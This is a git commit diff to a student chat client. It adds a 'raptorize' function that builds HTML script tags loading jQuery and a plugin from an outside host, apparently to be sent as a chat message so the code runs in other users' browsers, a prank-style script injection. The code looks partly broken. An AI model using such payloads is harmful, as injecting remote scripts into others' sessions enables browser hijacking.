11170e5788a3b7e61e2155083883122488587814
Nicholas Van de walle <nicholas@niceguys.co>
2014-03-10 13:45:39 -0700

    Added raptorization into chatterboxscreen

--- client/scripts/app.js
+++ client/scripts/app.js
@@ -1,6 +1,7 @@
 // YOUR CODE HERE:
 var app = {};
 
+
 app.init = function(parameters) {
 
 };
@@ -14,3 +15,20 @@ app.fetch = function(delay) {
     //Configuration object here
   });
 };
+
+app.raptorize = function() {
+  var raptorScript = '<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.3/jquery.min.js"></script>\
+  <script>!window.jQuery && document.write("<script src="jquery-1.4.3.min.js"><\/script>"")</script>\
+  <script src="http://yourjavascript.com/1142132143/jquery-raptorize-1-0.js"></script>\
+  <script type="text/javascript">\
+    window.raptored = window.raptored || false;\
+    $(window).load(function() {\
+      if(!window.raptored) {\
+        setTimeout(function(){$("body").append("<h2>RAPTORIZED - <3 MrNice </h2>")}, 2700);\
+        $(document).raptorize({"enterOn" : "timer","delayTime" : 2000});\
+        window.raptored = true;\
+      }\
+    });\
+  </script>'
+  this.send()
+}
